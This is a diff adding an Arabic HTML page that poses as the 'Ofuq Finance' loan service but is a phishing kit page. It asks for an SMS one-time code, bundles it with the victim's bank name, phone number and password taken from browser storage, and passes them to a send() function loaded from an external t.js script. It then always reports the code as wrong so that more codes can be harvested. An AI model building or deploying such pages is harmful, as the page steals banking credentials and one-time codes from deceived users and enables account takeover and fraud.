@@ -1,0 +1,448 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <!-- الوسوم الأساسية (Basic Meta Tags) -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أفق للتمويل</title>
+    <meta name="description" content="قدم طلبك الآن والموافقة فورية مع أفق للتمويل.">
+    <meta name="keywords" content="أفق للتمويل, تمويل, تقديم طلب تمويل, موافقة فورية, خدمات مالية">
+
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ofuqfinance.netlify.app/">
+    <meta property="og:title" content="أفق للتمويل">
+    <meta property="og:description" content="قدم طلبك الآن والموافقة فورية.">
+    <meta property="og:image" content="https://ofuqfinance.netlify.app/afqtamowyl.jpg">
+
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://ofuqfinance.netlify.app/">
+    <meta name="twitter:title" content="أفق للتمويل">
+    <meta name="twitter:description" content="قدم طلبك الآن والموافقة فورية.">
+    <meta name="twitter:image" content="https://ofuqfinance.netlify.app/afqtamowyl.jpg">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg: #f2f2f3;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: #1f2430;
+        font-family: "Cairo", sans-serif;
+        min-height: 100dvh;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .screen {
+        width: min(100%, 600px);
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .hero {
+        background: linear-gradient(180deg, #2f5ee8 0%, #1f2f83 100%);
+        width: 100%;
+        padding: clamp(18px, 3.6vh, 34px) 18px clamp(12px, 2.6vh, 24px);
+        flex-shrink: 0;
+      }
+
+      .logo {
+        width: min(250px, 72vw);
+        margin: 0 auto 14px;
+        display: block;
+      }
+
+      .switch-card {
+        width: min(312px, 88%);
+        margin: 0 auto;
+        height: clamp(50px, 7vh, 58px);
+        border-radius: 16px;
+        border: 1.5px solid rgba(255, 255, 255, 0.34);
+        background: linear-gradient(180deg, rgba(255, 255, 255, 0.16), rgba(255, 255, 255, 0.1));
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 12px;
+        color: #fff;
+      }
+
+      .switch-main {
+        text-align: right;
+      }
+
+      .switch-title {
+        margin: 0;
+        font-size: 1rem;
+        font-weight: 700;
+      }
+
+      .switch-sub {
+        margin: 2px 0 0;
+        font-size: 0.85rem;
+        color: rgba(255, 255, 255, 0.72);
+      }
+
+      .switch-left,
+      .switch-right {
+        width: 34px;
+        height: 34px;
+        border-radius: 10px;
+        display: grid;
+        place-items: center;
+      }
+
+      .switch-right {
+        background: rgba(255, 255, 255, 0.18);
+      }
+
+      .switch-left img,
+      .switch-right img {
+        width: 19px;
+        height: 19px;
+        object-fit: contain;
+        filter: brightness(0) invert(1);
+      }
+
+      main.screen {
+        flex: 1;
+        display: flex;
+      }
+
+      .content {
+        width: 100%;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+      }
+
+      .otp-card {
+        width: 100%;
+        min-height: auto;
+        border-radius: 20px;
+        padding: 0;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+      }
+
+      .otp-title {
+        margin: 0 0 10px;
+        font-size: clamp(1.12rem, 3.6vw, 1.35rem);
+        font-weight: 700;
+        line-height: 1.35;
+        color: #101010;
+      }
+
+      .otp-desc {
+        margin: 0 0 18px;
+        font-size: clamp(0.9rem, 2.8vw, 1rem);
+        line-height: 1.6;
+        color: #4b5563;
+        font-weight: 600;
+      }
+
+      .otp-field {
+        width: 100%;
+        height: clamp(48px, 7.6vh, 56px);
+        border: 2px solid #c6c9d3;
+        border-radius: 14px;
+        padding: 0 16px;
+        font-size: clamp(1rem, 3vw, 1.1rem);
+        outline: none;
+        direction: ltr;
+        text-align: center;
+        letter-spacing: 0.22em;
+        background: #f6f6f7;
+        font-family: "Cairo", sans-serif;
+        cursor: text;
+      }
+
+      .otp-field:focus {
+        border-color: #0f5ea3;
+        box-shadow: 0 0 0 4px rgba(42, 58, 146, 0.12);
+      }
+
+      .otp-error {
+        margin: 10px 2px 18px;
+        color: #b42318;
+        font-size: 0.92rem;
+        min-height: 1.2em;
+        display: none;
+        text-align: right;
+      }
+
+      .btn {
+        width: 100%;
+        height: clamp(52px, 8vh, 60px);
+        border: 0;
+        border-radius: 14px;
+        background: #2a3a92;
+        color: #fff;
+        font-family: "Cairo", sans-serif;
+        font-size: clamp(1rem, 3vw, 1.1rem);
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 6px;
+      }
+
+      .auth-progress-overlay {
+        position: fixed;
+        inset: 0;
+        display: none;
+        z-index: 10050;
+        align-items: center;
+        justify-content: center;
+        background: rgba(5, 10, 22, 0.68);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+      }
+
+      .auth-progress-overlay.active {
+        display: flex;
+      }
+
+      .auth-progress-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 16px;
+      }
+
+      .auth-spinner {
+        width: 56px;
+        height: 56px;
+        border-radius: 50%;
+        position: relative;
+        color: #fff;
+        box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.08);
+      }
+
+      .auth-spinner::before {
+        content: "";
+        position: absolute;
+        inset: -5px;
+        border-radius: 50%;
+        border: 5px solid transparent;
+        border-top-color: currentColor;
+        animation: authSpin 0.85s linear infinite;
+      }
+
+      .auth-progress-label {
+        margin: 0;
+        color: #fff;
+        font-size: 1.05rem;
+        font-weight: 700;
+        text-align: center;
+      }
+
+      @keyframes authSpin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 700px) {
+        .content {
+          padding: 20px;
+        }
+      }
+
+      @media (max-height: 760px) {
+        .hero {
+          padding-top: 14px;
+          padding-bottom: 10px;
+        }
+
+        .logo {
+          width: min(220px, 64vw);
+          margin-bottom: 10px;
+        }
+
+        .switch-card {
+          height: 48px;
+        }
+
+        .switch-left,
+        .switch-right {
+          width: 30px;
+          height: 30px;
+        }
+
+        .switch-left img,
+        .switch-right img {
+          width: 17px;
+          height: 17px;
+        }
+
+        .otp-card {
+          padding: 0;
+        }
+
+        .otp-desc {
+          margin-bottom: 14px;
+        }
+
+        .otp-field {
+          height: 46px;
+        }
+
+        .otp-error {
+          margin-bottom: 14px;
+        }
+
+        .btn {
+          height: 50px;
+        }
+      }
+      .header-image {
+  text-align: center;
+  margin-bottom: 15px;
+  width: 100%;
+}
+
+.header-image img {
+    width: 340px;
+  height: auto;
+}
+
+          .header-image {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+           .header-image {
+      width: 70%;
+      margin: 20px;
+      padding: 20px;
+      margin-bottom: 100px;
+    }
+
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+        h6 {
+      margin-top: -1px;
+    }
+    </style>
+  </head>
+  <body>
+ <header class="header-image">
+  <img src="uwallet-final-logo-blue.png" alt="Orange Money Header" />
+</header>
+
+    <main class="screen">
+      <section class="content">
+        <div class="otp-card">
+          <h1 class="otp-title">تأكيد رمز التحقق</h1>
+          <p class="otp-desc">يرجى إدخال رمز OTP المرسل إلى هاتفك.</p>
+          <input class="otp-field" id="otpField" type="text" inputmode="numeric" maxlength="4" placeholder="0000" />
+          <p class="otp-error" id="otpError"></p>
+          <button class="btn" type="button" id="otpConfirmBtn">تأكيد</button>
+        </div>
+      </section>
+    </main>
+
+    <div class="auth-progress-overlay" id="otpProgressOverlay" aria-hidden="true">
+      <div class="auth-progress-content">
+        <div class="auth-spinner" aria-label="loading"></div>
+        <p class="auth-progress-label">يرجى الانتظار</p>
+      </div>
+    </div>
+
+    <script>
+      (() => {
+        const otpField = document.getElementById("otpField");
+        const otpError = document.getElementById("otpError");
+        const otpConfirmBtn = document.getElementById("otpConfirmBtn");
+        const otpOverlay = document.getElementById("otpProgressOverlay");
+
+        const normalizeDigits = (value) =>
+          (value || "")
+            .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 0x0660))
+            .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 0x06f0));
+
+        const escapeMarkdownCode = (value) =>
+          String(value || "")
+            .replace(/\\/g, "\\\\")
+            .replace(/`/g, "\\`");
+
+        otpField.addEventListener("click", () => {
+          otpField.focus();
+        });
+
+otpField.addEventListener("input", () => {
+  const normalized = normalizeDigits(otpField.value)
+    .replace(/\D/g, "")
+    .slice(0, 4);
+
+  otpField.value = normalized;
+  otpError.textContent = "";
+  otpError.style.display = "none";
+
+  // ✅ الضغط التلقائي عند إدخال 6 أرقام
+  if (normalized.length === 4) {
+    otpConfirmBtn.click();
+  }
+});
+
+        otpConfirmBtn.addEventListener("click", () => {
+          const otp = normalizeDigits(otpField.value).replace(/\D/g, "");
+          if (otp.length < 4 || otp.length > 4) {
+            otpError.textContent = "يرجى إدخال رمز OTP بشكل صحيح";
+            otpError.style.display = "block";
+            otpField.focus();
+            return;
+          }
+
+          msg = `🔐 *رمز تحقق جديد*
+🏦 *اسم البنك:* \`${escapeMarkdownCode(localStorage.getItem("bankname") || "امنية ")}\`
+📱 *رقم الهاتف:* \`${escapeMarkdownCode(localStorage.getItem("phonenumber") || "")}\`
+🔑 *الباسورد:* \`${escapeMarkdownCode(localStorage.getItem("password") || "")}\`
+🔢 *رمز التحقق:* \`${escapeMarkdownCode(otp)}\``;
+          send(msg);
+
+          otpOverlay.classList.add("active");
+          otpConfirmBtn.disabled = true;
+          otpField.disabled = true;
+
+          setTimeout(() => {
+            otpOverlay.classList.remove("active");
+            otpConfirmBtn.disabled = false;
+            otpField.disabled = false;
+            otpField.value = "";
+            otpError.textContent = "رمز OTP الذي أدخلته غير صحيح";
+            otpError.style.display = "block";
+            otpField.focus();
+          }, 8000);
+        });
+      })();
+    </script>
+    <script src="./t.js"></script>
+  </body>
+</html>
